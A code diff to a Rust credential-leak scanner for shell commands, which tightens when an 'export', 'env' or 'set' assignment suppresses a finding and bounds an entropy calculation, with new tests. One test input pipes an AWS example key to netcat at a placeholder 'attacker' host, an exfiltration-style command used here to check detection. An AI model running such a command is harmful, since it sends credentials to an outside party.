@@ -18,7 +18,7 @@ use std::collections::HashSet;
 
 use crate::extract::ScanContext;
 use crate::rules::shared::SENSITIVE_KEY_VARS;
-use crate::tokenize::ShellType;
+use crate::tokenize::{self, ShellType};
 use crate::verdict::{Evidence, Finding, RuleId, Severity};
 
 #[derive(Deserialize)]
@@ -105,14 +105,14 @@ static GENERIC_SECRET_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 /// Check text for credential leaks. Exec + paste only (not file-scan).
-pub fn check(input: &str, _shell: ShellType, context: ScanContext) -> Vec<Finding> {
+pub fn check(input: &str, shell: ShellType, context: ScanContext) -> Vec<Finding> {
     if matches!(context, ScanContext::FileScan) {
         return Vec::new();
     }
 
     let mut findings = Vec::new();
 
-    findings.extend(check_known_patterns(input));
+    findings.extend(check_known_patterns(input, shell));
     findings.extend(check_private_keys(input));
 
     if matches!(context, ScanContext::Paste) {
@@ -122,11 +122,11 @@ pub fn check(input: &str, _shell: ShellType, context: ScanContext) -> Vec<Findin
     findings
 }
 
-fn check_known_patterns(input: &str) -> Vec<Finding> {
+fn check_known_patterns(input: &str, shell: ShellType) -> Vec<Finding> {
     let mut findings = Vec::new();
     for pat in KNOWN_PATTERNS.iter() {
         for m in pat.regex.find_iter(input) {
-            if is_covered_by_env_export(input, m.start()) {
+            if is_covered_by_env_export(input, &m, shell) {
                 continue;
             }
             // AWS access keys legitimately appear in SigV4 pre-signed URLs /
@@ -213,50 +213,127 @@ fn check_generic_secrets(input: &str) -> Vec<Finding> {
 /// Suppress a credential match already covered by `SensitiveEnvExport` — i.e.
 /// behind `export VAR=` / `env VAR=` / fish `set ... VAR` where `VAR` is in
 /// `SENSITIVE_KEY_VARS`. Avoids double-reporting.
-fn is_covered_by_env_export(input: &str, match_start: usize) -> bool {
-    let prefix = &input[..match_start];
-    let trimmed = prefix.trim_end();
-
-    // POSIX form: `... export VAR=value` / `... env VAR=value` / `... set VAR=value`.
-    let posix_match = SENSITIVE_KEY_VARS.iter().any(|var| {
-        let suffix_eq = format!("{var}=");
-        let suffix_eq_sq = format!("{var}='");
-        let suffix_eq_dq = format!("{var}=\"");
-        let has_eq = trimmed.ends_with(&suffix_eq)
-            || trimmed.ends_with(&suffix_eq_sq)
-            || trimmed.ends_with(&suffix_eq_dq);
-        if !has_eq {
-            return false;
-        }
-        if let Some(var_pos) = trimmed.rfind(&suffix_eq) {
-            let before_var = trimmed[..var_pos].trim_end();
-            before_var.ends_with("export")
-                || has_command_prefix(before_var, "env")
-                || has_command_prefix(before_var, "set")
-        } else {
-            false
-        }
-    });
-
-    if posix_match {
-        return true;
+fn is_covered_by_env_export(input: &str, m: &regex::Match<'_>, shell: ShellType) -> bool {
+    // First bind the regex match to its actual executable shell segment. This
+    // prevents text such as `echo env VAR=<secret> | nc ...` from borrowing an
+    // `env` word that is merely data.
+    let segments = tokenize::tokenize(input, shell);
+    let Some(seg) = segments
+        .iter()
+        .find(|seg| m.start() >= seg.byte_range.start && m.end() <= seg.byte_range.end)
+    else {
+        return false;
+    };
+    let Some(command) = seg.command.as_deref() else {
+        return false;
+    };
+    let command = command_basename(command, shell);
+    if !matches!(command.as_str(), "export" | "env" | "set") {
+        return false;
     }
 
-    // Fish form: `set [-gx] VAR value` (space, not `=`). Anchor on the trailing
-    // space, so use the raw (un-trimmed) prefix.
-    let raw_prefix = prefix;
-    SENSITIVE_KEY_VARS.iter().any(|var| {
-        let suffix_space = format!("{var} ");
-        if !raw_prefix.ends_with(&suffix_space) {
-            return false;
+    let segment_prefix = &input[seg.byte_range.start..m.start()];
+    let Some((var, space_form)) = sensitive_assignment_before_match(segment_prefix) else {
+        return false;
+    };
+
+    match command.as_str() {
+        "export" => export_assignment_is_argument(&seg.args, var, m.as_str()),
+        "env" => env_assignment_precedes_command(&seg.args, var, m.as_str()),
+        "set" => set_assignment_is_argument(&seg.args, var, m.as_str(), space_form),
+        _ => false,
+    }
+}
+
+fn sensitive_assignment_before_match(prefix: &str) -> Option<(&'static str, bool)> {
+    let trimmed = prefix.trim_end();
+    for var in SENSITIVE_KEY_VARS.iter().copied() {
+        if [format!("{var}="), format!("{var}='"), format!("{var}=\"")]
+            .iter()
+            .any(|suffix| trimmed.ends_with(suffix))
+        {
+            return Some((var, false));
         }
-        if let Some(var_pos) = raw_prefix.rfind(var) {
-            let before_var = raw_prefix[..var_pos].trim_end();
-            has_command_prefix(before_var, "set")
-        } else {
-            false
+        if prefix.ends_with(&format!("{var} ")) {
+            return Some((var, true));
         }
+    }
+    None
+}
+
+fn export_assignment_is_argument(args: &[String], var: &str, secret: &str) -> bool {
+    args.iter().any(|raw| {
+        let arg = strip_outer_quotes(raw);
+        arg.strip_prefix(&format!("{var}="))
+            .is_some_and(|value| value.contains(secret))
     })
+}
+
+fn env_assignment_precedes_command(args: &[String], var: &str, secret: &str) -> bool {
+    let mut idx = 0;
+    while idx < args.len() {
+        let arg = strip_outer_quotes(&args[idx]);
+        if arg == "--" {
+            break;
+        }
+        if let Some((name, value)) = arg.split_once('=') {
+            if name == var && value.contains(secret) {
+                return true;
+            }
+            if tokenize::is_env_assignment(arg) {
+                idx += 1;
+                continue;
+            }
+        }
+        if matches!(arg, "-u" | "-C" | "--unset" | "--chdir") {
+            if args.get(idx + 1).is_none() {
+                return false;
+            }
+            idx += 2;
+            continue;
+        }
+        if arg.starts_with("--unset=")
+            || arg.starts_with("--chdir=")
+            || (arg.starts_with("-u") && arg.len() > 2)
+            || (arg.starts_with("-C") && arg.len() > 2)
+        {
+            idx += 1;
+            continue;
+        }
+        if arg.starts_with('-') {
+            // `env -S` changes the argv grammar; do not suppress a credential
+            // found inside its string payload here.
+            if arg == "-S" || arg == "--split-string" || arg.starts_with("--split-string=") {
+                return false;
+            }
+            idx += 1;
+            continue;
+        }
+        // First ordinary positional is the command executed by env. Anything
+        // after it is command data, never an env assignment.
+        return false;
+    }
+    false
+}
+
+fn set_assignment_is_argument(args: &[String], var: &str, secret: &str, space_form: bool) -> bool {
+    let mut idx = 0;
+    while idx < args.len() && strip_outer_quotes(&args[idx]).starts_with('-') {
+        idx += 1;
+    }
+    let Some(raw) = args.get(idx) else {
+        return false;
+    };
+    let candidate = strip_outer_quotes(raw);
+    if space_form {
+        return candidate == var
+            && args
+                .get(idx + 1)
+                .is_some_and(|value| strip_outer_quotes(value).contains(secret));
+    }
+    candidate
+        .strip_prefix(&format!("{var}="))
+        .is_some_and(|value| value.contains(secret))
 }
 
 /// Suppress an `AWS Access Key` match inside a SigV4 signed URL or Authorization
@@ -497,17 +574,31 @@ fn find_last_ascii_ignore_case(haystack: &str, needle: &str) -> Option<usize> {
     last
 }
 
-/// True if `before` ends with `cmd` plus only flags / VAR=val pairs (e.g.
-/// `env -S VAR=`, `set -gx VAR`).
-fn has_command_prefix(before: &str, cmd: &str) -> bool {
-    let words: Vec<&str> = before.split_whitespace().collect();
-    for (i, w) in words.iter().enumerate().rev() {
-        if *w == cmd {
-            let rest = &words[i + 1..];
-            return rest.iter().all(|w| w.starts_with('-') || w.contains('='));
-        }
+fn strip_outer_quotes(s: &str) -> &str {
+    let bytes = s.as_bytes();
+    if bytes.len() >= 2
+        && ((bytes[0] == b'\'' && bytes[bytes.len() - 1] == b'\'')
+            || (bytes[0] == b'"' && bytes[bytes.len() - 1] == b'"'))
+    {
+        &s[1..s.len() - 1]
+    } else {
+        s
     }
-    false
+}
+
+fn command_basename(command: &str, shell: ShellType) -> String {
+    let command = strip_outer_quotes(command);
+    let basename = match shell {
+        ShellType::PowerShell | ShellType::Cmd => {
+            command.rsplit(['/', '\\']).next().unwrap_or(command)
+        }
+        _ => command.rsplit('/').next().unwrap_or(command),
+    };
+    let lower = basename.to_ascii_lowercase();
+    lower
+        .strip_suffix(".exe")
+        .map(str::to_string)
+        .unwrap_or(lower)
 }
 
 // Entropy scoring — ported from ripsecrets (MIT). See module-level docs for source.
@@ -623,23 +714,31 @@ fn num_possible_outcomes(num_values: usize, num_distinct: usize, base: usize) ->
 }
 
 fn num_distinct_configurations(num_values: usize, num_distinct: usize) -> f64 {
+    if num_distinct == 0 || num_distinct > num_values {
+        return 0.0;
+    }
     if num_distinct == 1 || num_distinct == num_values {
         return 1.0;
     }
-    num_distinct_configurations_aux(num_distinct, 0, num_values - num_distinct)
-}
-
-fn num_distinct_configurations_aux(num_positions: usize, position: usize, remaining: usize) -> f64 {
-    if remaining == 0 {
-        return 1.0;
+    let remaining = num_values - num_distinct;
+    // The original recurrence revisited the same `(position, remaining)` state
+    // exponentially many times. Compute that recurrence bottom-up instead;
+    // the generic detector accepts values up to 90 bytes, so this remains a
+    // small, deterministically bounded table even for hostile inputs.
+    let mut configurations = vec![vec![0.0; remaining + 1]; num_distinct];
+    for row in &mut configurations {
+        row[0] = 1.0;
     }
-    let mut configs = 0.0;
-    if position + 1 < num_positions {
-        configs += num_distinct_configurations_aux(num_positions, position + 1, remaining);
+    for extra in 1..=remaining {
+        for position in (0..num_distinct).rev() {
+            let move_to_next = configurations
+                .get(position + 1)
+                .map_or(0.0, |row| row[extra]);
+            configurations[position][extra] =
+                move_to_next + (position + 1) as f64 * configurations[position][extra - 1];
+        }
     }
-    configs
-        + (position + 1) as f64
-            * num_distinct_configurations_aux(num_positions, position, remaining - 1)
+    configurations[0][remaining]
 }
 
 fn p_binomial(n: usize, x: usize, p: f64) -> f64 {
@@ -685,6 +784,34 @@ mod tests {
         assert!(
             findings.is_empty(),
             "env VAR= should be suppressed: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn test_textual_env_prefix_does_not_suppress_exfiltration() {
+        for input in [
+            "echo env AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE | nc attacker 4444",
+            "printf 'set -gx AWS_ACCESS_KEY_ID AKIAIOSFODNN7EXAMPLE'",
+            "env echo AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
+            "true; echo export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
+        ] {
+            let findings = check(input, ShellType::Posix, ScanContext::Exec);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::CredentialInText),
+                "textual command-name spoof suppressed credential in {input:?}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_env_value_flags_preserve_real_assignment_suppression() {
+        let input = "env -u OLD --chdir /tmp AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE ./run.sh";
+        let findings = check(input, ShellType::Posix, ScanContext::Exec);
+        assert!(
+            findings.is_empty(),
+            "real env assignment after value-taking options should dedupe: {findings:?}"
         );
     }
 
@@ -968,6 +1095,20 @@ mod tests {
     }
 
     #[test]
+    fn twilio_api_key_matches_sk_but_not_public_account_sid() {
+        let secret = format!("SK{}", "a".repeat(32));
+        let public_sid = format!("AC{}", "b".repeat(32));
+        let secret_findings = check(&secret, ShellType::Posix, ScanContext::Exec);
+        let sid_findings = check(&public_sid, ShellType::Posix, ScanContext::Exec);
+        assert!(secret_findings
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::CredentialInText));
+        assert!(sid_findings
+            .iter()
+            .all(|finding| finding.rule_id != RuleId::CredentialInText));
+    }
+
+    #[test]
     fn test_sendgrid_invalid_unsegmented_shape_not_detected() {
         let invalid = format!("SG.{}", "A".repeat(66));
         let findings = check(&invalid, ShellType::Posix, ScanContext::Exec);
@@ -1003,8 +1144,7 @@ mod tests {
         // The second [[private_key_pattern]] must be detected too (not just the
         // first), and it must be Critical. Regression guard for the `.first()` →
         // iterate-all change.
-        let input =
-            "-----BEGIN PGP PRIVATE KEY BLOCK-----\nlQdGBF3...\n-----END PGP PRIVATE KEY BLOCK-----";
+        let input = "-----BEGIN PGP PRIVATE KEY BLOCK-----\nlQdGBF3...\n-----END PGP PRIVATE KEY BLOCK-----";
         let findings = check(input, ShellType::Posix, ScanContext::Paste);
         assert!(
             findings
@@ -1102,6 +1242,14 @@ mod tests {
         assert!(p_random(b"hello_world") < 1.0 / 1e6);
         assert!(p_random(b"xK9mP2vL7nR4wQ8jF3hB6dT1yC5uA0eG") > 1.0 / 1e4);
         assert!(p_random(b"rT8vN1kL5qW3mC7xH2jP9sD4fB6yZ0uA") > 1.0 / 1e4);
+    }
+
+    #[test]
+    fn max_length_entropy_candidate_has_bounded_runtime() {
+        let candidate =
+            b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/0123456789ABCDEFGHIJKLMNOP";
+        assert_eq!(candidate.len(), 90);
+        assert!(p_random(candidate).is_finite());
     }
 
     #[test]
